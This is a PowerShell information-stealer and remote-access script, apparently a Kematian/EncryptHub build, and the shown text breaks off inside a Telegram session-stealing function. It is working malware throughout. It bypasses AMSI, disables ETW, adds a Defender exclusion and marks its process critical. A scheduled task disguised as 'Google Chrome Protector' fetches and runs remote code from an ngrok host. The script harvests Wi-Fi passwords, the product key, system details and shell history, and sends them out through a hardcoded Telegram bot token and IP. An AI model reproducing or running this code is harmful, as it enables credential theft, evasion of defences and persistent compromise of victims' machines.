$webhook = 'h'+ 'ttp'+'s://'+'195.211.96.106:8080' 
$debug=$false
$blockhostsfile=$false
$criticalprocess=$true
$melt=$false
$fakeerror=$false
$persistence=$true
#$write_disk_only = $false
$vm_protect=$true
$record_mic=$false
$webcam=$false
#$encryption_key = "YOUR_ENC_KEY_HERE"
[Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12, Ssl3"

if ($debug) {
    $ProgressPreference = 'Continue'
}
else {
    $ErrorActionPreference = 'SilentlyContinue'
    $ProgressPreference = 'SilentlyContinue'
}

$decodedArt = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("IC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnwgICAgICAgICAgX19fX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgIF8gICBfICAgXyAgICAgICBfICAgICAgIF9fX18gIF8gICAgICAgICAgICAgXyAgICAgICAgICAgICAJICAgICAJIHwNCnwgICAgICAgICB8IF9fX198XyBfXyAgIF9fXyBfIF9fIF8gICBfIF8gX18gfCB8X3wgfCB8IHxfICAgX3wgfF9fICAgLyBfX198fCB8XyBfX18gIF9fIF98IHwgX19fIF8gX18gICAgICAgICAgICAgfA0KfCAgICAgICAgIHwgIF98IHwgJ18gXCAvIF9ffCAnX198IHwgfCB8ICdfIFx8IF9ffCB8X3wgfCB8IHwgfCAnXyBcICBcX19fIFx8IF9fLyBfIFwvIF8nIHwgfC8gXyBcICdfX3wgICAgICAgICAgICB8DQp8ICAgICAgICAgfCB8X19ffCB8IHwgfCAoX198IHwgIHwgfF98IHwgfF8pIHwgfF98ICBfICB8IHxffCB8IHxfKSB8ICBfX18pIHwgfHwgIF9fLyAoX3wgfCB8ICBfXy8gfCAgICAgICAgICAgICAgIHwNCnwgICAgICAgICB8X19fX198X3wgfF98XF9fX3xffCAgIFxfXywgfCAuX18vIFxfX3xffCB8X3xcX18sX3xfLl9fLyAgfF9fX18vIFxfX1xfX198XF9fLF98X3xcX19ffF98ICAgICAgICAgICAgICAgfA0KfCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfF9fXy98X3wgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8DQp8ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwNCnwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZWQgVGVhbWluZyBhbmQgT2ZmZW5zaXZlIFNlY3VyaXR5ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfA0KIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0="))
if ($debug){
	Write-Host $decodedArt -ForegroundColor Red
}

# SMILES-------------
$redExclamation = [char]0x203C
$MoneySymbol = [char]::ConvertFromUtf32(0x1F4B5)
$passwordSymbol = [char]::ConvertFromUtf32(0x1F511)
$cookieSymbol = [char]::ConvertFromUtf32(0x1F36A)
$messageSymbol = [char]::ConvertFromUtf32(0x2709)
$joystickSymbol = [char]::ConvertFromUtf32(0x1F3AE)
#--------------------
# COUNTERS-----------
$moneyCounter = 0
$cookieCounter = 0
$passwordCounter = 0
$messagersCounter = 0
$gamesCounter = 0

$vpnCounter = $false
$winscpCounter = $false
$ftpCounter = $false
$vncCounter = $false
#--------------------

function Send-TelegramMessage {
    param (
        [string]$message
    )

    $ErrorActionPreference = 'silentlycontinue'
    $Messaging = $message
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    $compSystem = Get-WmiObject -Class Win32_ComputerSystem
    $domain = $null
    if ($compSystem.PartOfDomain) {
        $domain = "$($compSystem.Domain)"
    } else {
		if ($debug){
			Write-Output "Domain not found"
		}
    }

    $botToken = "6991298066:AAGPSpmFZ_t4v8iEOrSCvt2ywjaCTbiFZgQ" 
	$chatID = "-1002187837029"
    $serverIP = "Server IP"
    $os = Get-WmiObject Win32_OperatingSystem
    $osVersion = $os.Caption
    $ipAddress = (Get-NetIPAddress | Where-Object { $_.InterfaceAlias -eq 'Ethernet' -and $_.AddressFamily -eq 'IPv4' }).IPAddress
    $ipInfo = Invoke-RestMethod -Uri "https://ipinfo.io/json"
    $externalIP = $ipInfo.ip
    $computerName = $env:COMPUTERNAME
    $userName = $env:USERNAME

    #----------LOCATION----------
    $ipInfo = Invoke-RestMethod -Uri "https://ipinfo.io/json"
    $location = $ipInfo.loc
    $city = $ipInfo.city
    $region = $ipInfo.region
    $country = $ipInfo.country

    if (-not (Test-Connection -ComputerName $serverIP -Count 1 -Quiet)) { 
        if($domain){
            $redExclamation = [char]0x203C
            $messageText = "$Messaging `n$country, $city`nIP: $externalIP/$ipAddress `nOS: $osVersion`nPC Name: $computerName`nUser Name: $userName `n$($redExclamation)Domain: <b>$domain</b>"
            $adminResponse = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/getChatAdministrators?chat_id=$chatID" -Method Get
            $admins = $adminResponse.result
            foreach ($admin in $admins) {
                $adminId = $admin.user.id
                $sendMessageParams = @{
                    chat_id = $adminId
                    text = $messageText
                    parse_mode = "HTML"
                }
                $jsonParams = $sendMessageParams | ConvertTo-Json -Depth 10
                $utf8JsonParams = [System.Text.Encoding]::UTF8.GetBytes($jsonParams)
                try {
                    Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -ContentType "application/json" -Body $utf8JsonParams
                } catch {
					
                    Write-Output "Restricted"
                }
            }
        } else {
            $messageText = "$Messaging `n$country, $city`nIP: $externalIP/$ipAddress `nOS: $osVersion`nPC Name: $computerName`nUser Name: $userName"
            $sendMessageParams = @{
                chat_id = $chatID
                text = $messageText
                parse_mode = "HTML"
            }

            $jsonParams = $sendMessageParams | ConvertTo-Json -Depth 10
            $utf8JsonParams = [System.Text.Encoding]::UTF8.GetBytes($jsonParams)

            Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -ContentType "application/json" -Body $utf8JsonParams
        }
    }
}

function Send-TelegramFile {
    param (
        [string]$ZIPfile,
		[int]$MoneyCount,
		[int]$PasswdCount,
		[int]$CookieCount,
		[int]$messagersCount,
		[int]$gamesCount
    )
	
	$greenCheckMark = [char]0x2705
	$redCrossMark = [char]0x274C
	
	$svpnCounter = if ($global:vpnCounter) { $greenCheckMark } else { $redCrossMark }
	$swinscpCounter = if ($global:winscpCounter) { $greenCheckMark } else { $redCrossMark }
	$sftpCounter = if ($global:ftpCounter) { $greenCheckMark } else { $redCrossMark }	
	$svncCounter = if ($global:vncCounter) { $greenCheckMark } else { $redCrossMark }	
	
    Send-File -filePath "$ZIPfile" -passwords "$PasswdCount" -cookies "$CookieCount" -wallets "$MoneyCount" -bVPN "$svpnCounter" -bWinSCP "$swinscpCounter" -bVNC "$svncCounter" -bFTP "$sftpCounter" -messagers "$messagersCount" -games "$gamesCount"
}
function Send-File {
    param (
        [string]$filePath,
        [string]$passwords,
        [string]$cookies,
        [string]$wallets,
		[string]$messagers,
		[string]$games,
        [string]$bVPN,
        [string]$bWinSCP,
        [string]$bFTP,
		[string]$bVNC
    )

    $ErrorActionPreference= 'silentlycontinue'
    #SMILES--------------
    $redExclamation = [char]0x203C
    $MoneySymbol = [char]::ConvertFromUtf32(0x1F4B5)
    $passwordSymbol = [char]::ConvertFromUtf32(0x1F511)
    $cookieSymbol = [char]::ConvertFromUtf32(0x1F36A)
	$messageSymbol = [char]::ConvertFromUtf32(0x2709)
	$joystickSymbol = [char]::ConvertFromUtf32(0x1F3AE)
    #--------------------
    $botToken = "6991298066:AAGPSpmFZ_t4v8iEOrSCvt2ywjaCTbiFZgQ" 
	$chatID = "-1002169041425"
    $webhook = "https://api.telegram.org/bot$botToken/sendDocument"

    $compSystem = Get-WmiObject -Class Win32_ComputerSystem
    $domain = if ($compSystem.PartOfDomain) { "$($compSystem.Domain)" } else { "No AD" }

    $os = Get-WmiObject Win32_OperatingSystem
    $osVersion = $os.Caption
    $ipAddress = (Get-NetIPAddress | Where-Object { $_.InterfaceAlias -eq 'Ethernet' -and $_.AddressFamily -eq 'IPv4' }).IPAddress
    $ipInfo = Invoke-RestMethod -Uri "https://ipinfo.io/json"
    $externalIP = $ipInfo.ip
    $computerName = $env:COMPUTERNAME
    $userName = $env:USERNAME
    $location = $ipInfo.loc
    $city = $ipInfo.city
    $region = $ipInfo.region
    $country = $ipInfo.country

    $caption = "$($redExclamation) Log [AIPS]`n$country, $city`nIP: $externalIP/$ipAddress `nOS: $osVersion`nPC Name: $computerName`nUser Name: $userName`n$($cookieSymbol) $cookies $($passwordSymbol) $passwords $($MoneySymbol) $wallets $($messageSymbol) $messagers $($joystickSymbol) $games`nDomain: $domain`nVPN: $bVPN`nFTP: $bFTP`nWinSCP: $bWinSCP`nVNC: $bVNC"

    Add-Type -AssemblyName "System.Net.Http"

    $httpClient = New-Object System.Net.Http.HttpClient
    $multipartContent = New-Object System.Net.Http.MultipartFormDataContent

    $multipartContent.Add((New-Object System.Net.Http.StringContent($chatID)), "chat_id")
    $multipartContent.Add((New-Object System.Net.Http.StringContent($caption)), "caption")

    $fileStream = [System.IO.File]::OpenRead($filePath)
    $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
    $multipartContent.Add($fileContent, "document", [System.IO.Path]::GetFileName($filePath))

    $response = $httpClient.PostAsync($webhook, $multipartContent).Result
    $responseContent = $response.Content.ReadAsStringAsync().Result
    $fileStream.Dispose()
    $httpClient.Dispose()
    $multipartContent.Dispose()
    $fileContent.Dispose()

    Write-Host $responseContent
}

# Load WPF assemblies
Add-Type -AssemblyName PresentationCore, PresentationFramework, System.Net.Http, System.Windows.Forms, System.Drawing

# Critical Process
function CriticalProcess {
    param ([Parameter(Mandatory = $true)][string]$MethodName, [Parameter(Mandatory = $true)][uint32]$IsCritical, [uint32]$Unknown1, [uint32]$Unknown2)
    [System.Diagnostics.Process]::EnterDebugMode() 
    $domain = [AppDomain]::CurrentDomain
    $name = New-Object System.Reflection.AssemblyName('DynamicAssembly')
    $assembly = $domain.DefineDynamicAssembly($name, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $module = $assembly.DefineDynamicModule('DynamicModule')
    $typeBuilder = $module.DefineType('PInvokeType', 'Public, Class')
    $methodBuilder = $typeBuilder.DefinePInvokeMethod('RtlSetProcessIsCritical', 'ntdll.dll',
        [System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::Static -bor [System.Reflection.MethodAttributes]::PinvokeImpl,
        [System.Runtime.InteropServices.CallingConvention]::Winapi, [void], [System.Type[]]@([uint32], [uint32], [uint32]),
        [System.Runtime.InteropServices.CallingConvention]::Winapi,
        [System.Runtime.InteropServices.CharSet]::Ansi)
    $type = $typeBuilder.CreateType()
    $methodInfo = $type.GetMethod('RtlSetProcessIsCritical')
    function InvokeRtlSetProcessIsCritical {
        param ([uint32]$isCritical, [uint32]$unknown1, [uint32]$unknown2)
        $methodInfo.Invoke($null, @($isCritical, $unknown1, $unknown2))
    }
    if ($MethodName -eq 'InvokeRtlSetProcessIsCritical') {
        InvokeRtlSetProcessIsCritical -isCritical $IsCritical -unknown1 $Unknown1 -unknown2 $Unknown2
    }
    else {
        Write-Host "Unknown method name: $MethodName"
    }
}

function KDMUTEX {
    if ($fakeerror) {
        [Windows.Forms.MessageBox]::Show("The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.", '', 'OK', 'Error')
    }
    $AppId = "62088a7b-ae9f-4802-827a-6e9c921cb48e"
    $CreatedNew = $false
    $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
    if (-not $CreatedNew) {
        throw "[!] An instance of this script is already running."
    }
    elseif ($criticalprocess -and -not $debug) {
        CriticalProcess -MethodName InvokeRtlSetProcessIsCritical -IsCritical 1 -Unknown1 0 -Unknown2 0	
    }
    Invoke-TASKS
}

# Request admin with AMSI bypass and ETW Disable
function CHECK_AND_PATCH {
    ${kematian} = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils').GetField('am' + 'siInitFailed', 'NonPublic,Static');
    ${CHaINSki} = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JGtlbWF0aWFuLlNldFZhbHVlKCRudWxsLCR0cnVlKQ==")) | &([regex]::Unescape("\u0069\u0065\u0078"))
    ([Reflection.Assembly]::LoadWithPartialName((('Sy'+'st'+'em.'+'Core'))).GetType((('System.Diag'+'n'+'o'+'sti'+'cs.Ev'+'e'+'nting'+'.E'+'vent'+'Provi'+'der'))).GetField((('m_en'+'abled')), (('N'+'onP'+'ublic,'+'Instanc'+'e'))).SetValue([Ref].Assembly.GetType((('Syst'+'em.Ma'+'nage'+'ment.Aut'+'om'+'ation.'+'Tra'+'cing.'+'PSEtw'+'LogPr'+'ovider'))).GetField((('etw'+'Prov'+'ider')), (('Non'+'Pub'+'lic,Sta'+'tic'))).GetValue($null), 0))
    $kematiancheck = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
    return $kematiancheck
}

function Invoke-TASKS {
    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp" -Force
    if ($persistence) {
        $backName = "WorkerTask"
		$task = Get-ScheduledTask -TaskName $backName -ErrorAction SilentlyContinue

		if ($task) {
			Unregister-ScheduledTask -TaskName $backName -Confirm:$false
		}

		$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$t = Iwr -Uri 'https://ratte.ngrok.app/main/zakrep/worker.ps1'|iex`",0)(window.close)"
		$task_trigger = New-ScheduledTaskTrigger -AtLogOn
		$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
		Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $backName -Description "Google Chrome Protector" -RunLevel Highest -Force | Out-Null

		$task = Get-ScheduledTask -TaskName $backName -ErrorAction SilentlyContinue
		if ($task) {
			if ($debug) {
				Write-Output "[+] Task AutoRun success" -ForegroundColor Green
			}
			$message = "$($redExclamation) [RAT] TASK AutoRun success"
			Send-TelegramMessage -message $message
			
			Start-ScheduledTask -TaskName $backName
		} else {
			if ($debug) {
				Write-Output "[!] Task AutoRun fail" -ForegroundColor Red
			}
			
			$message = "$($redExclamation) [RAT] TASK AutoRun fail"
			Send-TelegramMessage -message $message
		}
        Write-Host "[!] Persistence Added" -ForegroundColor Green
    }
    if ($blockhostsfile) {
        $link = "https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/blockhosts.ps1"
        iex (iwr -Uri $link -UseBasicParsing)
    }
    Backup-Data
}

function VMPROTECT {
    $link = ("https://ratte.ngrok.app/main/antivm.ps1")
    iex (iwr -uri $link -useb)
    Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT" -ForegroundColor Green
}
if ($vm_protect) {
    VMPROTECT
}

function Request-Admin {
    while (-not (CHECK_AND_PATCH)) {
        if ($PSCommandPath -eq $null) {
            Write-Host "Please run the script with admin!" -ForegroundColor Red
            Start-Sleep -Seconds 5
            Exit 1
        }
        if ($debug -eq $true) {
            try { Start-Process "powershell" -ArgumentList "-NoP -Ep Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit } catch {}
        }
        else {
            try { Start-Process "powershell" -ArgumentList "-Win Hidden -NoP -Ep Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit } catch {}
        } 
    }    
}

function Backup-Data {
    
    Write-Host "[!] Exfiltration in Progress..." -ForegroundColor Green
    $username = $env:USERNAME
    $hostname = $env:COMPUTERNAME
    $uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
    $timezone = Get-TimeZone
    $offsetHours = $timezone.BaseUtcOffset.Hours
    $timezoneString = "UTC$offsetHours"
    $filedate = Get-Date -Format "yyyy-MM-dd"
    $cc = (Invoke-WebRequest -Uri "https://www.cloudflare.com/cdn-cgi/trace" -useb).Content
    $countrycode = ($cc -split "`n" | ? { $_ -match '^loc=(.*)$' } | % { $Matches[1] })
    $folderformat = "$env:APPDATA\Kematian\$countrycode-($hostname)-($filedate)-($timezoneString)"

    $folder_general = $folderformat
    $folder_messaging = "$folderformat\Messaging Sessions"
    $folder_gaming = "$folderformat\Gaming Sessions"
    $folder_crypto = "$folderformat\Crypto Wallets"
    $folder_vpn = "$folderformat\VPN Clients"
    $folder_email = "$folderformat\Email Clients"
    $important_files = "$folderformat\Important Files"
    $browser_data = "$folderformat\Browser Data"
    $ftp_clients = "$folderformat\FTP Clients"
	$vnc_clients = "$folderformat\VNC Clients"
    $password_managers = "$folderformat\Password Managers" 

    $folders = @($folder_general, $folder_messaging, $folder_gaming, $folder_crypto, $folder_vpn, $folder_email, $important_files, $browser_data, $ftp_clients, $vnc_clients, $password_managers)
    foreach ($folder in $folders) { if (Test-Path $folder) { Remove-Item $folder -Recurse -Force } }
    $folders | ForEach-Object {
        New-Item -ItemType Directory -Path $_ -Force | Out-Null
    }
    Write-Host "[!] Backup Directories Created" -ForegroundColor Green
	
    function Get-Network {
        $resp = (Invoke-WebRequest -Uri "https://www.cloudflare.com/cdn-cgi/trace" -useb).Content
        $ip = [regex]::Match($resp, 'ip=([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)').Groups[1].Value
        $url = "http://ip-api.com/json"
        $hosting = (Invoke-WebRequest -Uri "http://ip-api.com/line/?fields=hosting" -useb).Content
        $response = Invoke-RestMethod -Uri $url -Method Get
        if (-not $response) {
            return "Not Found"
        }
        $country = $response.country
        $regionName = $response.regionName
        $city = $response.city
        $zip = $response.zip
        $lat = $response.lat
        $lon = $response.lon
        $isp = $response.isp
        return "IP: $ip `nCountry: $country `nRegion: $regionName `nCity: $city `nISP: $isp `nLatitude: $lat `nLongitude: $lon `nZip: $zip `nVPN/Proxy: $hosting"
    }

    $networkinfo = Get-Network
    $lang = (Get-WinUserLanguageList).LocalizedName
    $date = Get-Date -Format "r"
    $osversion = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption
    $windowsVersion = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
    $buildNumber = $windowsVersion.CurrentBuild; $ubR = $windowsVersion.UBR; $osbuild = "$buildNumber.$ubR" 
    $displayversion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").DisplayVersion
    $mfg = (Get-CimInstance -ClassName Win32_ComputerSystem).Manufacturer
    $model = (Get-CimInstance -ClassName Win32_ComputerSystem).Model
    $CPU = (Get-CimInstance -ClassName Win32_Processor).Name
    $corecount = (Get-CimInstance -ClassName Win32_Processor).NumberOfCores
    $GPU = (Get-CimInstance -ClassName Win32_VideoController).Name
    $total = (Get-CimInstance -ClassName Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB
    $raminfo = "{0:N2} GB" -f $total
    $mac = (Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }).MACAddress -join ","
    
    # A cool banner 
    $guid = [Guid]::NewGuid()
    $guidString = $guid.ToString()
    $suffix = $guidString.Substring(0, 8)  
    $prefixedGuid = "EncryptHub-MAIN-" + $suffix
    $kematian_banner = ("4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXDQrilZEgICAgICAgICAgX19fX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgIF8gICBfICAgXyAgICAgICBfICAgICAgIF9fX18gIF8gICAgICAgICAgICAgXyAgICAgICAgICAgIAkgICAgCeKVkQ0K4pWRICAgICAgICAgfCBfX19ffF8gX18gICBfX18gXyBfXyBfICAgXyBfIF9fIHwgfF98IHwgfCB8XyAgIF98IHxfXyAgIC8gX19ffHwgfF8gX19fICBfXyBffCB8IF9fXyBfIF9fICAgICAgICAgICAg4pWRDQrilZEgICAgICAgICB8ICBffCB8ICdfIFwgLyBfX3wgJ19ffCB8IHwgfCAnXyBcfCBfX3wgfF98IHwgfCB8IHwgJ18gXCAgXF9fXyBcfCBfXy8gXyBcLyBfYCB8IHwvIF8gXCAnX198ICAgICAgICAgICDilZENCuKVkSAgICAgICAgIHwgfF9fX3wgfCB8IHwgKF9ffCB8ICB8IHxffCB8IHxfKSB8IHxffCAgXyAgfCB8X3wgfCB8XykgfCAgX19fKSB8IHx8ICBfXy8gKF98IHwgfCAgX18vIHwgICAgICAgICAgICAgIOKVkQ0K4pWRICAgICAgICAgfF9fX19ffF98IHxffFxfX198X3wgICBcX18sIHwgLl9fLyBcX198X3wgfF98XF9fLF98Xy5fXy8gIHxfX19fLyBcX19cX19ffFxfXyxffF98XF9fX3xffCAgICAgICAgICAgICAg4pWRDQrilZEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHxfX18vfF98ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDilZENCuKVkSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkQ0K4pWRICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVkIFRlYW1pbmcgYW5kIE9mZmVuc2l2ZSBTZWN1cml0eSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4pWRDQrilZrilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ0=")
    $kematian_strings = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($kematian_banner))
    $kematian_info = "$kematian_strings `nLog Name : $hostname `nBuild ID : $prefixedGuid`n"
    
    function Get-Uptime {
        $ts = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName $computername).LastBootUpTime
        $uptimedata = '{0} days {1} hours {2} minutes {3} seconds' -f $ts.Days, $ts.Hours, $ts.Minutes, $ts.Seconds
        $uptimedata
    }
    $uptime = Get-Uptime

    function Get-InstalledAV {
        $wmiQuery = "SELECT * FROM AntiVirusProduct"
        $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery -EA "Ignore"
        $AntivirusProduct.displayName
    }
    $avlist = Get-InstalledAV | Format-Table | Out-String
    
    $width = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n')[0] -split ' ')[0]
    $height = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n')[0] -split ' ')[2]  
    $split = "x"
    $screen = "$width" + "$split" + "$height"

    $software = Get-ItemProperty "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" |
    Where-Object { $_.DisplayName -ne $null -and $_.DisplayVersion -ne $null } |
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
    Format-Table -Wrap -AutoSize |
    Out-String

    $network = Get-NetAdapter |
    Select-Object Name, InterfaceDescription, PhysicalMediaType, NdisPhysicalMedium |
    Out-String

    $startupapps = Get-CimInstance Win32_StartupCommand |
    Select-Object Name, Command, Location, User |
    Format-List |
    Out-String

    $runningapps = Get-WmiObject Win32_Process |
    Select-Object Name, Description, ProcessId, ThreadCount, Handles |
    Format-Table -Wrap -AutoSize |
    Out-String

    $services = Get-WmiObject Win32_Service |
    Where-Object State -eq "Running" |
    Select-Object Name, DisplayName |
    Sort-Object Name |
    Format-Table -Wrap -AutoSize |
    Out-String
    
    function diskdata {
        $disks = Get-WmiObject -Class "Win32_LogicalDisk" -Namespace "root\CIMV2" | Where-Object { $_.Size -gt 0 }
        $results = foreach ($disk in $disks) {
            try {
                $SizeOfDisk = [math]::Round($disk.Size / 1GB, 0)
                $FreeSpace = [math]::Round($disk.FreeSpace / 1GB, 0)
                $usedspace = [math]::Round(($disk.Size - $disk.FreeSpace) / 1GB, 2)
                $FreePercent = [int](($FreeSpace / $SizeOfDisk) * 100)
                $usedpercent = [int](($usedspace / $SizeOfDisk) * 100)
            }
            catch {
                $SizeOfDisk = 0
                $FreeSpace = 0
                $FreePercent = 0
                $usedspace = 0
                $usedpercent = 0
            }

            [PSCustomObject]@{
                Drive             = $disk.Name
                "Total Disk Size" = "{0:N0} GB" -f $SizeOfDisk 
                "Free Disk Size"  = "{0:N0} GB ({1:N0} %)" -f $FreeSpace, $FreePercent
                "Used Space"      = "{0:N0} GB ({1:N0} %)" -f $usedspace, $usedpercent
            }
        }
        $results | Where-Object { $_.PSObject.Properties.Value -notcontains '' }
    }
    $alldiskinfo = diskdata -wrap -autosize | Format-List | Out-String
    $alldiskinfo = $alldiskinfo.Trim()

    $info = "$kematian_info`n`n[Network] `n$networkinfo `n[Disk Info] `n$alldiskinfo `n`n[System] `nLanguage: $lang `nDate: $date `nTimezone: $timezoneString `nScreen Size: $screen `nUser Name: $username `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `nCPU: $cpu `nCores: $corecount `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime `nAntiVirus: $avlist `n`n[Network Adapters] $network `n[Startup Applications] $startupapps `n[Processes] $runningapps `n[Services] $services `n[Software] $software"
    $info | Out-File -FilePath "$folder_general\System.txt" -Encoding UTF8

    Function Get-WiFiInfo {
        $wifidir = "$env:tmp"
        New-Item -Path "$wifidir\wifi" -ItemType Directory -Force | Out-Null
        netsh wlan export profile folder="$wifidir\wifi" key=clear | Out-Null
        $xmlFiles = Get-ChildItem "$wifidir\wifi\*.xml"
        if ($xmlFiles.Count -eq 0) {
            return $false
        }
        $wifiInfo = @()
        foreach ($file in $xmlFiles) {
            [xml]$xmlContent = Get-Content $file.FullName
            $wifiName = $xmlContent.WLANProfile.SSIDConfig.SSID.name
            $wifiPassword = $xmlContent.WLANProfile.MSM.security.sharedKey.keyMaterial
            $wifiAuth = $xmlContent.WLANProfile.MSM.security.authEncryption.authentication
            $wifiInfo += [PSCustomObject]@{
                SSID     = $wifiName
                Password = $wifiPassword
                Auth     = $wifiAuth
            }
        }
        $wifiInfo | Format-Table -AutoSize | Out-String
        $wifiInfo | Out-File -FilePath "$folder_general\WIFIPasswords.txt" -Encoding UTF8
    }
    $wifipasswords = Get-WiFiInfo 
    ri "$env:tmp\wifi" -Recurse -Force

    function Get-ProductKey {
        try {
            $regPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform'
            $keyName = 'BackupProductKeyDefault'
            $backupProductKey = Get-ItemPropertyValue -Path $regPath -Name $keyName
            return $backupProductKey
        }
        catch {
            return "No product key found"
        }
    }
    Get-ProductKey > $folder_general\productkey.txt

    Get-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue | Out-File -FilePath "$folder_general\clipboard_history.txt" -Encoding UTF8 

    #------------------#
    #  MESSAGING       #
    #------------------#
    
    # Telegram 
    Write-Host "[!] Session Grabbing Started" -ForegroundColor Green
    function telegramstealer {
        $processname = "telegram"
        $pathtele = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
